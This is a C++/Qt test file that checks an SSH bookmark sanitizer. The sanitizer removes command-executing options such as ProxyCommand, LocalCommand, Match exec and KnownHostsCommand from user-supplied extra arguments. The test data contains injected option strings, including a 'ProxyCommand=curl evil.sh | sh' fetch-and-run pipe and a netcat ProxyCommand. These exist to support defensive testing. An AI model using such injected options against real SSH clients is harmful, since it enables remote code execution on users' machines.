// Feature-conformance test for spec.md — asserts that
// SshBookmark::sanitizeExtraArgs rejects ProxyCommand/LocalCommand/
// PermitLocalCommand in both single-token and space-separated forms,
// preserves all other options, and reports rejected tokens.
//
// Also exercises the end-to-end toSshCommand to confirm a poisoned
// bookmark never emits the dangerous option to the final command.
//
// Exit 0 = all assertions hold. Non-zero = regression.

#include "sshdialog.h"

#include <QCoreApplication>

#include <cstdio>

namespace {

int g_failures = 0;

void expect(bool ok, const char *label, const QString &detail = QString()) {
    std::fprintf(stderr, "[%-58s] %s%s%s\n",
                 label, ok ? "PASS" : "FAIL",
                 detail.isEmpty() ? "" : " — ",
                 qUtf8Printable(detail));
    if (!ok) ++g_failures;
}

void testSanitize() {
    // Single-token ProxyCommand
    {
        QStringList rej;
        auto safe = SshBookmark::sanitizeExtraArgs(
            "-oProxyCommand=curl evil", &rej);
        expect(!safe.contains("-oProxyCommand=curl"),
               "sanitize: -oProxyCommand= rejected");
        expect(rej.contains("-oProxyCommand=curl"),
               "sanitize: out_rejected captures the token");
    }

    // Space-separated form
    {
        QStringList rej;
        auto safe = SshBookmark::sanitizeExtraArgs(
            "-o ProxyCommand=curl", &rej);
        expect(safe.isEmpty(),
               "sanitize: -o ProxyCommand= (2-tok) rejects both tokens");
        expect(rej.size() == 2 && rej[0] == "-o" && rej[1] == "ProxyCommand=curl",
               "sanitize: out_rejected captures both tokens in order");
    }

    // Case variants on key name
    {
        auto safe = SshBookmark::sanitizeExtraArgs("-oproxycommand=x");
        expect(safe.isEmpty(),
               "sanitize: lowercase proxycommand= rejected");
    }
    {
        auto safe = SshBookmark::sanitizeExtraArgs("-oPROXYCOMMAND=x");
        expect(safe.isEmpty(),
               "sanitize: UPPER PROXYCOMMAND= rejected");
    }

    // LocalCommand + PermitLocalCommand
    {
        auto safe = SshBookmark::sanitizeExtraArgs(
            "-oLocalCommand=x -oPermitLocalCommand=yes");
        expect(safe.isEmpty(),
               "sanitize: LocalCommand + PermitLocalCommand both rejected");
    }

    // Match exec — ssh_config(5) directive that runs a shell command.
    // Added 0.7.12 after the re-review sweep flagged it as HIGH.
    // (Residual `evil` token passes through as an unrelated positional
    // arg — ssh would reject it as an unknown option — that's fine;
    // the protection is dropping the `-oMatch=` option itself.)
    {
        auto safe = SshBookmark::sanitizeExtraArgs("-oMatch=exec evil");
        expect(!safe.contains("-oMatch=exec"),
               "sanitize: -oMatch= rejected (prevents Match exec RCE)");
    }
    {
        auto safe = SshBookmark::sanitizeExtraArgs("-o Match=exec evil");
        expect(!safe.contains("-o") || !safe.contains("Match=exec"),
               "sanitize: -o Match= (two-tok) rejected");
    }

    // KnownHostsCommand — also executed via /bin/sh -c (OpenSSH 8.5+).
    {
        auto safe = SshBookmark::sanitizeExtraArgs(
            "-oKnownHostsCommand=/tmp/evil");
        expect(safe.isEmpty(),
               "sanitize: -oKnownHostsCommand= rejected");
    }

    // Bare trailing `-o` — no value follows. Previously slipped through
    // to ssh verbatim; low-risk (ssh errors out) but cleaner to drop.
    // Actually: current implementation preserves it since there's no
    // payload key to check. Test the current behavior so we notice if
    // it changes.
    {
        auto safe = SshBookmark::sanitizeExtraArgs("foo -o");
        // This is the CURRENT (intentional) behavior — just documents it.
        // A future tightening could drop the trailing -o; update here.
        expect(safe.contains("-o"),
               "sanitize: bare trailing -o passes through (documents current)");
    }

    // Safe options pass through
    {
        auto safe = SshBookmark::sanitizeExtraArgs(
            "-oStrictHostKeyChecking=no -p 2222 -4");
        expect(safe.size() == 4,
               "sanitize: safe -o + -p + -4 all preserved");
        expect(safe.contains("-oStrictHostKeyChecking=no"),
               "sanitize: StrictHostKeyChecking preserved");
        expect(safe.contains("-4"),
               "sanitize: -4 short flag preserved");
    }

    // Mixed safe + dangerous
    {
        QStringList rej;
        auto safe = SshBookmark::sanitizeExtraArgs(
            "-o StrictHostKeyChecking=no -oProxyCommand=nc evil 22 -L 8080:localhost:80",
            &rej);
        expect(safe.contains("-o"),
               "sanitize: keeps safe -o / key pair");
        expect(safe.contains("StrictHostKeyChecking=no"),
               "sanitize: keeps safe key=value");
        expect(!safe.contains("-oProxyCommand=nc"),
               "sanitize: drops dangerous");
        expect(safe.contains("-L"),
               "sanitize: keeps -L port forward");
        expect(rej.contains("-oProxyCommand=nc"),
               "sanitize: reports the dangerous one");
    }

    // Empty input
    {
        auto safe = SshBookmark::sanitizeExtraArgs("");
        expect(safe.isEmpty(), "sanitize: empty input → empty output");
    }

    // Whitespace-only input
    {
        auto safe = SshBookmark::sanitizeExtraArgs("   \t  ");
        expect(safe.isEmpty(), "sanitize: whitespace-only → empty output");
    }
}

void testEndToEnd() {
    // A poisoned bookmark must NOT produce a ProxyCommand in the final
    // ssh command. This is the invariant that actually protects users.
    SshBookmark bm;
    bm.host = "example.com";
    bm.user = "root";
    bm.extraArgs = "-oProxyCommand=curl evil.sh | sh";

    const QString cmd = bm.toSshCommand();

    expect(!cmd.contains("ProxyCommand", Qt::CaseInsensitive),
           "e2e: toSshCommand drops the injected ProxyCommand",
           QString("got: %1").arg(cmd));
    expect(cmd.contains("root@example.com"),
           "e2e: host + user still present",
           QString("got: %1").arg(cmd));
    expect(cmd.contains("--"),
           "e2e: still emits -- host separator (prior fix intact)");
}

}  // namespace

int main(int argc, char **argv) {
    QCoreApplication app(argc, argv);

    testSanitize();
    testEndToEnd();

    if (g_failures > 0) {
        std::fprintf(stderr, "\n%d assertion(s) failed.\n", g_failures);
        return 1;
    }
    return 0;
}
